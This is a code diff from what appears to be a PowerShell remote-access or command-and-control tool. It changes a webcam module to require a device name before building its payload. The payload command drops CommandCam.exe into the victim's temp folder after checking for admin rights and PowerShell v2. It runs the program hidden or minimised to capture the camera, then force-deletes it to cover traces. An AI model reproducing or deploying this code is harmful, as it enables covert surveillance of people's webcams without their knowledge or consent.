@@ -1063,22 +1063,27 @@ While($Client.Connected)
           $File = "$Bin$name"
           write-host " - Input Device Name to Use: " -NoNewline;
           $deviceName = Read-Host;
-          If(([System.IO.File]::Exists("$File")))
+          If(-not($deviceName))
           {
-            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
-            $FileBytes = "($FileBytes)";
-            $File = $File.Split('\')[-1];
-            $File = $File.Split('/')[-1];
-            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";powershell -version 2 Start-Process -FilePath `$env:tmp\CommandCam.exe /devname `"$deviceName`" /quiet -WindowStyle Hidden;Start-Sleep -Seconds 3;cmd /R del /Q /F %tmp%\CommandCam.exe}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /devname `"$deviceName`" /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /devname `"$deviceName`" /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}";            
-            $Command = $Command -replace "#","$File";
-            $Command = $Command -replace "@","$FileBytes";
-            $Camflop = "True";
-            $Upload = $True;
-          } Else {
-            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
-            Write-Host "   ------   ---------";
-            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
-            $Command = $Null;
+            write-host "`n`n   [i] None Device Name enter, Aborting .." -ForegroundColor Red;Start-Sleep -Seconds 2;
+          } else {
+            If(([System.IO.File]::Exists("$File")))
+            {
+              $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+              $FileBytes = "($FileBytes)";
+              $File = $File.Split('\')[-1];
+              $File = $File.Split('/')[-1];
+              $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";powershell -version 2 Start-Process -FilePath `$env:tmp\CommandCam.exe /devname `"$deviceName`" /quiet -WindowStyle Hidden;Start-Sleep -Seconds 3;cmd /R del /Q /F %tmp%\CommandCam.exe}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /devname `"$deviceName`" /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /devname `"$deviceName`" /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}";            
+              $Command = $Command -replace "#","$File";
+              $Command = $Command -replace "@","$FileBytes";
+              $Camflop = "True";
+              $Upload = $True;
+            } Else {
+              Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
+              Write-Host "   ------   ---------";
+              Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
+              $Command = $Null;
+            }
           }
         }
         If($Cam_choise -eq "Return" -or $Cam_choise -eq "return" -or $Cam_choise -eq "cls" -or $Cam_choise -eq "Modules" -or $Cam_choise -eq "modules" -or $Cam_choise -eq "clear")
